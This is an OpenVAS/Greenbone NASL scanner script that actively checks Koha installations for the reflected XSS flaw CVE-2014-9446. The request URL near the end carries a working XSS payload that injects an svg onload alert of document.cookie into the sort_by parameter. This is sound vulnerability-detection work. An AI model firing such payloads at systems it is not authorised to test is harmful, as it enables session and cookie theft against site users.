# Copyright (C) 2015 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:koha:koha";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.805355");
  script_version("2022-08-29T10:21:34+0000");
  script_tag(name:"last_modification", value:"2022-08-29 10:21:34 +0000 (Mon, 29 Aug 2022)");
  script_tag(name:"creation_date", value:"2015-03-27 19:14:22 +0530 (Fri, 27 Mar 2015)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2014-9446");

  script_tag(name:"qod_type", value:"remote_analysis");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Koha < 3.16.6, 3.18.x < 3.18.2 Multiple XSS Vulnerabilities - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2015 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_koha_http_detect.nasl");
  script_mandatory_keys("koha/http/detected");
  script_require_ports("Services/www", 80);

  script_tag(name:"summary", value:"Koha is prone to multiple cross-site scripting (XSS)
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Multiple errors exist as input passed via:

  - the sort_by parameter to the opac parameter in 'opac-search.pl'

  - the sort_by parameter to the intranet parameter in 'catalogue/search.pl'

  are not validated before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in the context of an affected site.");

  script_tag(name:"affected", value:"Koha prior to version 3.16.6 and version 3.18.x prior to
  3.18.2.");

  script_tag(name:"solution", value:"Update to version 3.16.6 or 3.18.2 or later.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/71803");
  script_xref(name:"URL", value:"http://bugs.koha-community.org/bugzilla3/show_bug.cgi?id=13425");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = '/cgi-bin/koha/opac-search.pl?idx=kw&q=12&sort_by="><svg/onload=alert(document.cookie)>&addto=';

if( http_vuln_check( port:port, url:url, check_header:TRUE, pattern:"alert\(document\.cookie\)",
                     extra_check:">Log in" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
